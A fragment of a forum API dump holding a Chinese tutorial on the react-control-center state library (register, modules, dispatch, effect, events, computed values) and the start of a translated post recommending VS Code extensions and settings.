}\n}\n\nReactDOM.render(&lt;App &#x2F;&gt;, document.getElementById(&#x27;app&#x27;));\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/16918e1e850c23df?w=1117&amp;h=536&amp;f=gif&amp;s=1072680\" alt=\"渲染出CCHello\">\n上面动态图中我们可以看到几点<code>&lt;CCHello /&gt;</code>与<code>&lt;Hello /&gt;</code>表现不一样的地方</p>\n<blockquote>\n<ul>\n<li>初次添加一个<code>&lt;CCHello /&gt;</code>的时候，input框里直接出现了zzk字符串</li>\n<li>添加了3个<code>&lt;CCHello /&gt;</code>后，对其中输入名字后，另外两个也同步渲染了</li>\n</ul>\n</blockquote>\n<p>为什么CC组件会如此表现呢，接下来我们聊聊<code>register</code></p>\n<h4><code>register</code>，普通组件通往cc世界的桥梁</h4>\n<p>我们先看看register函数签名解释，因为register函数式如此重要，所以我尽可能的解释清楚每一个参数的意义，但是如果你暂时不想了解细节，可以直接略过这段解释，不妨碍你阅读后面的内容哦^_^，<a href=\"https://juejin.im/post/5c714e576fb9a049de6dff12\">了解跟多关于register函数的解释</a></p>\n<pre class=\"prettyprint\"><code>&#x2F;****\n * @param {string} ccClassKey cc类的名称，你可以使用多个cc类名注册同一个react类，但是不能用同一个cc类名注册多个react类\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {object} registerOption 注册的可选参数\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {string} [registerOption.module] 声明当前cc类属于哪个模块，默认是&#96;$$default&#96;模块\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {Array&lt;string&gt;|string} [registerOption.sharedStateKeys] \n * 定义当前cc类共享所属模块的哪些key值，默认空数组，写为&#96;*&#96;表示观察并共享所属模块的所有key值变化\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {Array&lt;string&gt;|string} [registerOption.globalStateKeys] \n * 定义当前cc类共享globa模块的哪些key值，默认空数组，写为&#96;*&#96;表示观察并共享globa模块的所有key值变化\n * ============   !!!!!!  ============\n * 注意key命名重复问题，因为一个cc实例的state是由global state、模块state、自身state合成而来，\n * 所以cc不允许sharedStateKeys和globalStateKeys有重复的元素\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {object} [registerOption.stateToPropMapping] { (moduleName&#x2F;keyName)&#x2F;(alias), ...}\n * 定义将模块的state绑定到cc实例的$$propState上，默认&#x27;{}&#x27;\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {object} [registerOption.isPropStateModuleMode] \n * 默认是false，表示stateToPropMapping导出的state在$$propState是否需要模块化展示\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {string} [registerOption.reducerModule]\n * 定义当前cc类的reducer模块，默认和&#x27;registerOption.module&#x27;相等\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {string} [registerOption.extendInputClass] \n * 是否直接继承传入的react类，默认是true，cc默认使用反向继承的策略来包裹你传入的react类，这以为你在cc实例可以通过&#x27;this.&#x27;直接呼叫任意cc实例方法，如果可以设置&#x27;registerOption.extendInputClass&#x27;为false，cc将会使用属性代理策略来包裹你传入的react类，在这种策略下，所有的cc实例方法只能通过&#x27;this.props.&#x27;来获取。\n * 跟多的细节可以参考cc化的antd-pro项目的此组件 https:&#x2F;&#x2F;github.com&#x2F;fantasticsoul&#x2F;rcc-antd-pro&#x2F;blob&#x2F;master&#x2F;src&#x2F;routes&#x2F;Forms&#x2F;BasicForm.js\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {string} [registerOption.isSingle] 该cc类是否只能实例化一次，默认是false\n * 如果你只允许当前cc类被实例化一次，这意味着至多只有一个该cc类的实例能存在\n * 你可以设置&#x27;registerOption.isSingle&#x27;为true，这有点类似java编码里的单例模式了^_^\n * &#x27; - - - - - - - - - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - -&#x27;\n * @param {string} [registerOption.asyncLifecycleHook] 是否是cc类的生命周期函数异步化，默认是false\n * 我们可以在cc类里定义这些生命周期函数&#x27;$$beforeSetState&#x27;、&#x27;$$afterSetState&#x27;、&#x27;$$beforeBroadcastState&#x27;,\n * 他们默认是同步运行的,如果你设置&#x27;registerOption.isSingle&#x27;为true，\n * cc将会提供给这些生命周期函数next句柄放在他们参数列表的第二位，\n *  * ============   !!!!!!  ============\n * 你必须调用next，否则当前cc实例的渲染动作将会被永远阻塞，不会触发新的渲染\n * &#96;&#96;&#96;\n * $$beforeSetState(executeContext, next){\n *   &#x2F;&#x2F;例如这里如果忘了写&#x27;next()&#x27;调用next, 将会阻塞该cc实例的&#x27;reactSetState&#x27;和&#x27;broadcastState&#x27;等操作~_~\n * }\n * &#96;&#96;&#96;\n *&#x2F;\n</code></pre><p>通过<code>register</code>函数我们来解释上面遗留的两个现象的由来</p>\n<blockquote>\n<ul>\n<li>初次添加一个<code>&lt;CCHello /&gt;</code>的时候，input框里直接出现了zzk字符串.</li>\n</ul>\n<blockquote>\n<p>因为我们注册<code>Hello</code>为<code>CCHello</code>的时候，语句如下<br>\n<code>const CCHello = cc.register('Hello',{sharedStateKeys:'*'})(Hello);</code><br>\n没有声明任何模块，所以<code>CCHello</code>属于<code>$$default</code>模块，定义了<code>sharedStateKeys</code>为<code>*</code>，<br>\n表示观察和共享<code>$$default</code>模块的整个状态,所以在<code>starup</code>里定义的<code>store</code>的<code>name</code>就被同步到<code>CCHello</code>了</p>\n</blockquote>\n<ul>\n<li>添加了3个<code>&lt;CCHello /&gt;</code>后，对其中输入名字后，另外两个也同步渲染了</li>\n</ul>\n<blockquote>\n<p>因为对其中一个<code>&lt;CCHello /&gt;</code>输入名字时，<br>\n其他两个<code>&lt;CCHello/&gt;</code>他们也属于’$$default’模块，也共享和观察<code>name</code>的变化，<br>\n所以其实任意一个<code>&lt;CCHello /&gt;</code>的输入，cc都会将状态广播到其他两个<code>&lt;CCHello /&gt;</code></p>\n</blockquote>\n</blockquote>\n<h4>多模块话组织状态树</h4>\n<p>前面文章我们介绍<code>cc.startup</code>时说起推荐用户使用多模块话启动<code>cc</code>,所以我们稍稍改造一下<code>starup</code>启动参数，让我们的不仅仅只是使用cc的内置模块<code>$$default</code>和<code>$$global</code>。\n定义两个新的模块<code>foo</code>和<code>bar</code>,可以把他们的state定义成一样的。</p>\n<pre class=\"prettyprint\"><code>cc.startup({\n  isModuleMode:true,\n  store:{\n    $$default:{\n      name:&#x27;zzk of $$default&#x27;,\n      info:&#x27;cc&#x27;,\n    },\n    foo:{\n      name:&#x27;zzk of foo&#x27;,\n      info:&#x27;cc&#x27;,\n    },\n    bar:{\n      name:&#x27;zzk of bar&#x27;,\n      info:&#x27;cc&#x27;,\n    }\n  }\n});\n</code></pre><p>以<code>Hello</code>类为输入新注册2个cc类<code>HelloFoo</code>和<code>HelloBar</code>,然后渲染他们看看效果吧</p>\n<pre class=\"prettyprint\"><code>const CCHello = cc.register(&#x27;Hello&#x27;,{sharedStateKeys:&#x27;*&#x27;})(Hello);\nconst HelloFoo = cc.register(&#x27;HelloFoo&#x27;,{module:&#x27;foo&#x27;,sharedStateKeys:&#x27;*&#x27;})(Hello);\nconst HelloBar= cc.register(&#x27;HelloBar&#x27;,{module:&#x27;bar&#x27;,sharedStateKeys:&#x27;*&#x27;})(Hello);\n\nclass App extends React.Component {\n  constructor(props) {\n    super(props);\n  }\n  render() {\n    return (\n      &lt;div className=&quot;app-box&quot;&gt;\n       &lt;Hello title=&quot;normal instance&quot;&#x2F;&gt;\n        &lt;CCHello title=&quot;cc instance1 of module $$default&quot;&#x2F;&gt;\n        &lt;CCHello title=&quot;cc instance1 of module $$default&quot;&#x2F;&gt;\n        &lt;br &#x2F;&gt;\n        &lt;HelloFoo title=&quot;cc instance3 of module foo&quot;&#x2F;&gt;\n        &lt;HelloFoo title=&quot;cc instance3 of module foo&quot;&#x2F;&gt;\n        &lt;br &#x2F;&gt;\n        &lt;HelloBar title=&quot;cc instance3 of module bar&quot;&#x2F;&gt;\n        &lt;HelloBar title=&quot;cc instance3 of module bar&quot;&#x2F;&gt;\n      &lt;&#x2F;div&gt;\n    )\n  }\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/16919c81360def2b?w=1242&amp;h=456&amp;f=gif&amp;s=1723718\" alt=\"多个模块的Hello\">\n以上我们演示了用同一个react类注册为观察着不同模块state的cc类，可以发现尽管视图是一样的，但是他们的状态在模块化的模式下被相互隔离开了，这也是为什么推荐用模块化方式启动cc，因为业务的划分远远不是两个内置模块就能表达的</p>\n<h4>让一个模块被被另外的react类注册</h4>\n<p>上面我们演示了用同一个react类注册到不同的模块，下面我们写另一个react类<code>Wow</code>来观察<code>$$default</code>模块</p>\n<pre class=\"prettyprint\"><code>class Wow extends React.Component {\n  constructor(props) {\n    super(props);\n    this.state = { name:&#x27;&#x27; };\n  }\n  render() {\n    const {name} = this.state;\n    return (\n      &lt;div className=&quot;wow-box&quot;&gt;\n        wow {name} &lt;input value={name} onChange={(e)=&gt;this.setState({name:e.currentTarget.value})} &#x2F;&gt;\n      &lt;&#x2F;div&gt;\n    )\n  }\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/16919c323b06c4d5?w=1276&amp;h=531&amp;f=gif&amp;s=2336330\" alt=\"Wow来了\"></p>\n<hr>\n<h3>dispatch，更灵活的setState</h3>\n<p><a href=\"https://codepen.io/fantasticsoul/pen/omKxqv\">在线示例代码</a></p>\n<h4>让业务逻辑和视图渲染逻辑彻底分离</h4>\n<p>我们知道，视图渲染代码和业务代码混在一起，对于代码的重构或者维护是多么的不友好，所以尽管cc提供<code>setState</code>来改变状态，但是我们依然推荐<code>dispatch</code>方式来使用cc，让业务逻辑和视图渲染逻辑彻底分离</p>\n<h4>定义reducer</h4>\n<p>我们在启动cc时，为foo模块定义一个和foo同名的reducer配置在启动参数里</p>\n<pre class=\"prettyprint\"><code>  reducer:{\n    foo:{\n      changeName({payload:name}){\n        return {name};\n      }\n    }\n  }\n</code></pre><p>现在让我们修改<code>Hello</code>类用<code>dispatch</code>去修改state吧,可以声明派发foo模块的reducer去生成新的state并修改foo，当state模块和reducer模块重名时，可以用简写方式</p>\n<pre class=\"prettyprint\"><code>  changeName = (e)=&gt;{\n     const name = e.currentTarget.value;\n    &#x2F;&#x2F;this.setState({name});\n    this.$$dispatch(&#x27;foo&#x2F;changeName&#x27;, payload:name);\n    &#x2F;&#x2F;等价与this.$$dispatch(&#x27;foo&#x2F;foo&#x2F;changeName&#x27;, payload:name);\n    &#x2F;&#x2F;等价于this.$$dispatch({ module: &#x27;foo&#x27;, reducerModule:&#x27;foo&#x27;,type: &#x27;changeName&#x27;, payload: name });\n  }\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/16919e82b756914b?w=1215&amp;h=547&amp;f=gif&amp;s=1174178\" alt=\"Wow来了\"></p>\n<h4>对模块精确划分</h4>\n<p>上面贴图中，我们看到当我们修改<code>&lt;HelloFoo/&gt;</code>实例里的input的框的时候,<code>&lt;HelloFoo/&gt;</code>如我们预期那样发生了变化，但是我们在<code>&lt;HelloBar/&gt;</code>或者<code>&lt;CCHello/&gt;</code>里输入字符串时，他们没有变化，却触发了<code>&lt;HelloFoo/&gt;</code>发生，这是为什么呢？<br>\n我们回过头来看看<code>Hello</code>类里的<code>this.$$dispatch</code>函数，指定了状态模块是<code>foo</code>,所以这里就出问题了<br>\n让我们去掉<code>this.$$dispatch</code>里的状态模块，修改为总是用<code>foo</code>这个reducerModule模块的函数去生成新的state，但是不指明具体的目标状态模块，这样cc实例在发起<code>$$this.dispatch</code>调用时就会默认去修改当cc类所属的状态模块</p>\n<pre class=\"prettyprint\"><code>  changeName = (e)=&gt;{\n     const name = e.currentTarget.value;\n    &#x2F;&#x2F;this.setState({name});\n    &#x2F;&#x2F;不指定module，只指定reducerModule，cc实例调用时会去修改自己默认的所属状态模块的状态\n    this.$$dispatch({reducerModule:&#x27;foo&#x27;,type: &#x27;changeName&#x27;, payload: name });\n  }\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a01b2288e1df?w=1225&amp;h=513&amp;f=gif&amp;s=2141517\" alt=\"Wow来了\">\n上图的演示效果正如我们的预期效果，三个注册到不同的模块的cc组件使用了同一个recuder模块的方法去更新状态。\n让我们这里总结下cc查找reducer模块的规律</p>\n<blockquote>\n<ul>\n<li>不指定state模块和reducer模块时，cc发起<code>$$dispatch</code>调用的默认寻找的目标state模块和目标reducer模块就是当前cc类所属的目标state模块和目标reducer模块</li>\n<li>只指定state模块不指定reducer模块时，默认寻找的目标state模块和目标reducer模块都是指定的state模块</li>\n<li>不指定state模块，只指定reducer模块时，默认寻找的目标state模块是当前cc类所属的目标state模块，寻找的reducer模块就是指定的reducer模块</li>\n<li>两者都指定的时候，cc严格按照用户的指定值去查询reducer函数和修改指定目标的state模块</li>\n</ul>\n</blockquote>\n<p>cc这里灵活的把recuder模块这个概念也抽象出来，为了方便用户按照自己的习惯归类各个修改状态函数。<br>\n大多数时候，用户习惯把state module的命名和reducer module的命名保持一致，但是cc允许你定义一些额外的recuder module，这样具体的reducer函数归类方式就很灵活了，用户可按照自己的理解去做归类</p>\n<h4>dispatch，发起副作用调用</h4>\n<p>我们知道，react更新状态时，一定会有副作用产生，这里我们加一个需求，更新foo模块的name时，通知bar模块也更新name字段，同时上传一个name到后端，拿后端返回的结果更新到<code>$$default</code>模块的name字段里，让我们小小改造一下changeName函数</p>\n<pre class=\"prettyprint\"><code>async function mockUploadNameToBackend(name) {\n  return &#x27;name uploaded&#x27;\n}\n\n\n    changeName: async function ({ module, dispatch, payload: name }) {\n      if (module === &#x27;foo&#x27;) {\n        await dispatch(&#x27;bar&#x2F;foo&#x2F;changeName&#x27;, name);\n        const result = await mockUploadNameToBackend(name);\n        await dispatch(&#x27;$$default&#x2F;foo&#x2F;changeName&#x27;, result);\n        return { name };\n      } else {\n        return { name };\n      }\n    }\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a1ae3e27e5d9?w=1198&amp;h=567&amp;f=gif&amp;s=1236912\" alt=\"dispatch\">\ncc支持reducer函数可以是async或者generator函数，其实reducer函数的参数excutionContext可以解构出<code>module</code>、<code>effect</code>、<code>xeffect</code>、<code>state</code>、<code>moduleState</code>、<code>globalState</code>、<code>dispatch</code>等参数，\n我们在reducer函数发起了其他的副作用调用</p>\n<h4>dispatch内部，组合其他dispatch</h4>\n<p>cc并不强制要求所有的reducer函数返回一个新的state，所以我们可以利用dispatch发起调用组合其他的dispatch<br>\n基于上面的需求，我们再给自己来下一个这样的需求，当foo模块的实例输入的是<code>666</code>的时候，把``foo<code>、</code>bar<code>的所有实例的那么重置为</code>恭喜你中奖500万<code>了，我们保留原来的changeName，新增一个函数</code>changeNameWithAward<code>和</code>awardYou<code>,然后组件里调用</code>changeNameWithAward`</p>\n<pre class=\"prettyprint\"><code>    awardYou: function ({dispatch}) {\n      const award = &#x27;恭喜你中奖500万&#x27;;\n      Promise.all(\n        [\n          dispatch(&#x27;foo&#x2F;changeName&#x27;, award),\n          dispatch(&#x27;bar&#x2F;foo&#x2F;changeName&#x27;, award)\n        ]\n      );\n    },\n    changeNameWithAward: async function ({ module, dispatch, payload: name }) {\n      console.log(&#x27;changeNameWithAward&#x27;, module, name);\n      if (module === &#x27;foo&#x27; &amp;&amp; name === &#x27;666&#x27;) {\n        dispatch(&#x27;foo&#x2F;awardYou&#x27;);\n      } else {\n        console.log(&#x27;changeName&#x27;);\n        dispatch(&#96;${module}&#x2F;foo&#x2F;changeName&#96;, name);\n      }\n    }\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a5086a11b3d3?w=1258&amp;h=587&amp;f=gif&amp;s=1979730\" alt=\"dispatch2\">\n我们可以看到<code>awardYou</code>里并没有返回新的state，而是并行调用changeName。\ncc基于这样的组合dispatch理念可以让你跟灵活的组织代码和重用已有的reducer函数</p>\n<h3>effect，最灵活的setState</h3>\n<h4>不想用<code>dispatch</code>和<code>reducer</code>组合拳？试试<code>effect</code></h4>\n<p><code>effect</code>其实和<code>dispatch</code>是一样的作用，生成新的state，只不过不需要指定reducerModule和type让cc从reducer定义里找到对应的函数执行逻辑，而是直接把函数交给effect去执行<br>\n让我们在<code>Hello</code>组件里稍稍改造一下，当name为888的时候，不调用<code>$$dispatch</code>而是调用<code>$$effect</code></p>\n<pre class=\"prettyprint\"><code>    function myChangeName(name, prefix) {\n      return { name: &#96;${prefix}${name}&#96; };\n    }\n\n  changeName = (e) =&gt; {\n    const name = e.currentTarget.value;\n    &#x2F;&#x2F; this.setState({name});\n    &#x2F;&#x2F; this.$$dispatch(&#x27;foo&#x2F;changeName&#x27;, name);\n    if(name===&#x27;888&#x27;){\n        const currentModule = this.cc.ccState.module;\n        &#x2F;&#x2F;add prefix 888\n        this.$$effect(currentModule, myChangeName, name, &#x27;8&#x27;);\n    }else{\n      this.$$dispatch({reducerModule:&#x27;foo&#x27;,type: &#x27;changeNameWithAward&#x27;, payload: name });  \n    }\n  }\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a6447c7b5e0c?w=1228&amp;h=574&amp;f=gif&amp;s=1735978\" alt=\"dispatch2\">\neffect必须指定具体的模块，如果想自动默认使用当前实例的所属模块可以写为</p>\n<pre class=\"prettyprint\"><code>this.$invoke(myChangeName, name, &#x27;8&#x27;);\n</code></pre><h4>dispatch使用effect？同样可以</h4>\n<p>上面我们演示recuder函数时有提到executionContext里可以解构出<code>effect</code>,所以用户可以在reducher函数里一样的使用effect</p>\n<pre class=\"prettyprint\"><code>awardYou:function ({dispatch, effect}) {\n  const award = &#x27;恭喜你中奖500万&#x27;;\n  await Promise.all([\n    dispatch(&#x27;foo&#x2F;changeName&#x27;, award),\n    dispatch(&#x27;bar&#x2F;foo&#x2F;changeName&#x27;, award)\n  ]);\n  await effect(&#x27;bar&#x27;,function(info){\n      return {info}\n  },&#x27;wow cool&#x27;);\n}\n</code></pre><h4>effect使用dispatch呢？同样可以</h4>\n<p>想用在effect内部使用<code>dispatch</code>,需要使用cc提供的<code>xeffect</code>函数，默认把用户自定义函数的第一位参数占用了，传递executionContext给第一位参数</p>\n<pre class=\"prettyprint\"><code>    async function myChangeName({dispatch, effect}, name, prefix) {\n      &#x2F;&#x2F;call effect or dispatch as you expected\n      return { name: &#96;${prefix}${name}&#96; };\n    }\n    \n    changeName = (e) =&gt; {\n        const name = e.currentTarget.value;\n        this.$$xeffect(currentModule, myChangeName, name, &#x27;8&#x27;);\n  }\n</code></pre><hr>\n<h3>状态广播</h3>\n<h4>状态广播延迟</h4>\n<p>该参数大多时候用户都不需要用到，cc可以为<code>setState</code>、<code>$$dispatch</code>、<code>effect</code>都可以设置言辞时间，单位是毫秒，侧面印证cc是的状态过程存在，这里我们设置当输入是<code>222</code>时，3秒延迟广播状态, （备注，不设定时，cc默认是-1，表示不延迟广播）</p>\n<pre class=\"prettyprint\"><code>    this.setState({name});\n    ---&gt; 可以修改为如下代码，备注，第二位参数是react.setState的callback，cc做了保留 \n    this.setState({name}, null, 3000);\n    \n    this.$$effect(currentModule, myChangeName, name, &#x27;eee&#x27;);\n    ---&gt; 可以修改为如下代码，备注，$$xeffect对应的延迟函数式$$lazyXeffect\n     this.$$lazyEffect(currentModule, myChangeName, name, &#x27;eee&#x27;);\n    \n    this.$$dispatch({ reducerModule: &#x27;foo&#x27;, type: &#x27;changeNameWithAward&#x27;, payload: name });\n    ---&gt; 可以修改为如下代码，备注，$$xeffect对应的延迟函数式$$lazyXeffect\n     this.$$dispatch({ lazyMs:3000, reducerModule: &#x27;foo&#x27;, type: &#x27;changeNameWithAward&#x27;, payload: name });\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a64e574511aa?w=1203&amp;h=196&amp;f=gif&amp;s=292567\" alt=\"dispatch2\"></p>\n<hr>\n<h3>类vue</h3>\n<h4>关于emit</h4>\n<p>cc允许用户对cc类实例定义<code>$$on</code>、<code>$$onIdentity</code>,以及调用<code>$$emit</code>、<code>$$emitIdentity</code>、<code>$$off</code><br>\n我们继续对上面的需求做扩展，当用户输入<code>999</code>时，发射一个普通事件<code>999</code>，输入<code>9999</code>时，发射一个认证事件名字为<code>9999</code>证书为<code>9999</code>，我们继续改造<code>Hello</code>类，在componentDidMount里开始监听</p>\n<pre class=\"prettyprint\"><code>    componentDidMount(){\n        this.$$on(&#x27;999&#x27;,(from, wording)=&gt;{\n          console.log(&#96;%c${from}, ${wording}&#96;,&#x27;color:red;border:1px solid red&#x27; );\n        });\n        if(this.props.ccKey==&#x27;9999&#x27;){\n          this.$$onIdentity(&#x27;9999&#x27;,&#x27;9999&#x27;,(from, wording)=&gt;{\n            console.log(&#96;%conIdentity triggered,${from}, ${wording}&#96;,&#x27;color:red;border:1px solid red&#x27; );\n          });\n        }\n     } \n     \n    changeName = (e) =&gt; {\n        &#x2F;&#x2F; ......\n        if(name === &#x27;999&#x27;){\n          this.$$emit(&#x27;999&#x27;, this.cc.ccState.ccUniqueKey, &#x27;hello&#x27;);\n        }else if(name === &#x27;9999&#x27;){\n          this.$$emitIdentity(&#x27;9999&#x27;, &#x27;9999&#x27;, this.cc.ccState.ccUniqueKey, &#x27;hello&#x27;);\n        }\n    }\n</code></pre><p>注意哦，你不需要在computeWillUnmount里去$$off事件，这些cc都已经替你去做了，当一个cc实例销毁时，cc会取消掉它的监听函数，并删除对它的引用，防止内存泄露\n<img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a836ab2390b0?w=931&amp;h=307&amp;f=gif&amp;s=645167\" alt=\"emit\"></p>\n<h4>关于computed</h4>\n<p>我们可以对cc类定义$$computed方法，对某个key或者多个key的值定义computed函数，只有当这些key的值发生变化时，cc会触发计算这些key对应的computed函数，并将其缓存起来<br>\n我们在cc类定义的computed描述对象计算出的值，可以从<code>this.$$refComputed</code>里取出计算结果，而我们在启动时为模块的state定义的computed描述对象计算出的值,可以从<code>this.$$moduleComputed</code>里取出计算结果，特别地，如果我们为<code>$$global</code>模块定义了computed描述对象，可以从<code>this.$$globalComputed</code>里取出计算结果<br>\n现在我们为类定义computed方法，将输入的值反转,代码如下</p>\n<pre class=\"prettyprint\"><code>$$computed() {\n  return {\n    name(name) {\n      return name.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);\n    }\n  }\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a8b60cb360d0\" alt=\"computed\"></p>\n<h4>关于ccDom</h4>\n<p>cc默认采用的是反向继承的方式包裹你的react类，所以在reactDom树看到的组件非常干净，不会有多级包裹\n<img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a8d953c32d4d?w=609&amp;h=397&amp;f=gif&amp;s=274633\" alt=\"ccdom\"></p>\n<h4>关于顶层函数和store</h4>\n<p>现在，你可以打开console，输入<code>cc.</code>,可以直接呼叫<code>dispatch</code>、<code>emit</code>、<code>setState</code>等函数，让你快速验证你的渲染逻辑，输入sss，查看整个cc的状态树结构\n<img src=\"https://user-gold-cdn.xitu.io/2019/2/23/1691a8fb22a6bf65?w=749&amp;h=413&amp;f=gif&amp;s=279746\" alt></p>\n<hr>\n<h3>结语</h3>\n<p>好了，基本上cc驱动视图渲染的3个基本函数介绍就到这里了，cc只是提供了最最基础驱动视图渲染的方式，并不强制用户使用哪一种，用户可以根据自己的实际情况摸索出最佳实践<br>\n因为cc接管了setState,所以cc可以不需要包裹<code>&lt;Provider /&gt;</code>，让你的可以快速的在已有的项目里使用起来,</p>\n<p><a href=\"https://github.com/fantasticsoul/rcc-simple-demo/blob/master/src/cc-use-case/ForTutorial3/index.js\">具体代码点此处</a></p>\n<p><a href=\"https://codepen.io/fantasticsoul/pen/QYeMje\">线上演示点此处</a>,注：线上演示代码不完整，最完整的<a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">运行此项目</a></p>\n</div>","title":"setState, react数据驱动视图的灵魂，也是react-control-center的灵魂","last_reply_at":"2019-02-25T04:19:44.297Z","good":false,"top":false,"reply_count":1,"visit_count":552,"create_at":"2019-02-24T03:32:30.490Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c735ee8e1a81129a7ada317","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>译者按：</strong> IDE是生产力的保证！</p>\n<ul>\n<li>原文：<a href=\"http://tilomitra.com/vs-code-settings-and-extensions-for-faster-javascript-development/\">Visual Studio Code Settings and Extensions for Faster JavaScript Development</a></li>\n<li>译者: <a href=\"https://www.fundebug.com/\">Fundebug</a></li>\n</ul>\n<p><strong>本文采用意译，版权归原作者所有</strong></p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-01.jpeg\" alt></p>\n<p>2年之前，我放弃了Sublime Text，选择了<a href=\"https://code.visualstudio.com/\">Visual Studio Code</a>作为代码编辑器。</p>\n<p>我每天花在VS Code上的时间长达5~6个小时，因此按照我的需求优化VS Code配置十分必要。过去这2年里，我试过各种各样的插件与配置，而现在我感觉一切都完美了，是时候给大家分享一下我的使用技巧了！</p>\n<h3>插件</h3>\n<p>VS Code有着非常丰富的插件，这里我给大家推荐几个我最喜欢的VS Code插件。</p>\n<h4><a href=\"https://marketplace.visualstudio.com/items?itemName=esbenp.prettier-vscode\">Prettier Code Formatter</a></h4>\n<p><strong>下载量：167万</strong></p>\n<p>我使用Prettier来统一代码风格，当我保存HTML/CSS/JavaScript文件时，它会自动调整代码格式。这样，我不用担心代码格式问题了。由于Prettier本身不能个性化配置，有时可能会引起不适，但是至少保证团队成员可以轻易统一代码风格。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-02.png\" alt></p>\n<h4><a href=\"https://marketplace.visualstudio.com/items?itemName=eg2.vscode-npm-script\">npm</a></h4>\n<p><strong>下载量：119万</strong></p>\n<p>npm插件可以检查package.json中所定义的npm模块与实际安装的npm模块是否一致：</p>\n<ul>\n<li>package.json中定义了，但是实际未安装</li>\n<li>package.json中未定义，但是实际安装了</li>\n<li>package.json中定义的版本与实际安装的版本不一致</li>\n</ul>\n<p><img src=\"https://image.fundebug.com/2019-02-23-03.png\" alt></p>\n<h4><a href=\"https://marketplace.visualstudio.com/items?itemName=christian-kohler.npm-intellisense\">npm Intellisense</a></h4>\n<p><strong>下载量：105万</strong></p>\n<p>npm Intellisense插件会为package.json建立索引，这样当我require某个模块时，它可以自动补全。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-04.gif\" alt></p>\n<h4><a href=\"https://marketplace.visualstudio.com/items?itemName=CoenraadS.bracket-pair-colorizer\">Bracket Pair Colorizer</a></h4>\n<p><strong>下载量：95万</strong></p>\n<p>Bracket Pair Colorizer可以为代码中的匹配的括号自动着色，以不同的颜色进行区分，这样我们可以轻易地辨别某个代码块的开始与结束。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-05.png\" alt></p>\n<p><em><a href=\"https://www.fundebug.com/\">Fundebug</a>, 1代码搞定BUG监控！</em></p>\n<h4><a href=\"https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-close-tag\">Auto Close Tag</a></h4>\n<p><strong>下载量：117万</strong></p>\n<p>Auto Close Tag插件的功能非常简单，它可以自动补全HTML/XML的关闭标签。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-06.gif\" alt></p>\n<h4><a href=\"https://marketplace.visualstudio.com/items?itemName=eamodio.gitlens\">GitLens</a></h4>\n<p><strong>下载量：164万</strong></p>\n<p>我非常喜欢Gitlens，因为它可以帮助我快速理解代码的修改历史。</p>\n<p><strong>Current Line Blame</strong>：查看当前行代码的结尾查看最近一次commit的姓名、时间以及信息</p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-07.png\" alt></p>\n<p><strong>Current Line Hovers</strong>：在当前行代码的悬浮框查看详细的最近一次的commit信息。</p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-08.png\" alt></p>\n<h4><a href=\"https://marketplace.visualstudio.com/items?itemName=yzhang.markdown-all-in-one\">Markdown All in One</a></h4>\n<p><strong>下载量：45万</strong></p>\n<p>Markdown All in One插件帮助我编写README以及其他MarkDown文件。我尤其喜欢它处理列表以及表格的方式。</p>\n<p><strong>自动调整列表的数字序号</strong></p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-09.gif\" alt></p>\n<p><strong>自动格式化表格</strong></p>\n<p><img src=\"https://image.fundebug.com/2019-02-23-10.gif\" alt></p>\n<h3>用户配置</h3>\n<p>除了安装各种各样的插件，我们还可以通过配置VS Code的User Settings来个性化我们的VS Code。</p>\n<h4>字体设置</h4>\n<p>我非常喜欢带有ligatures(合字、连字、连结字或合体字)的字体。ligatures就是将多于一个字母的合成一个字形。我主要使用<a href=\"https://github.com/tonsky/FiraCode\">Fira Code</a>作为我编程所使用的字体，如下图中的<code>=&gt;</code>与<code>===</code>：</p>\n<p><img src=\"https://image.fundebug.com/2019-02-24-001.png\" alt></p>\n<p>我的字体配置如下:</p>\n<pre class=\"prettyprint language-json\"><code>&quot;editor.fontFamily&quot;: &quot;&#x27;Fira Code&#x27;, &#x27;Operator 